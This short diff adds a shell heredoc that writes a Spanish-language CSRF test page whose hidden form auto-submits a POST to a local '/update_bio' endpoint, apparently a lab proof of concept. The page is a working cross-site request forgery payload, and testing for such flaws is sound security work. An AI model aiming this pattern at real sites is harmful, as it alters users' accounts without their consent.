@@ -1,0 +1,20 @@
+cat > csrf.html <<'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Prueba CSRF</title>
+</head>
+<body>
+    <h2>Contenido externo de prueba</h2>
+
+    <form id="csrf" action="http://localhost:5000/update_bio" method="POST">
+        <input type="hidden" name="nueva_bio"
+               value="Biografia modificada mediante prueba CSRF">
+    </form>
+
+    <script>
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
+EOF
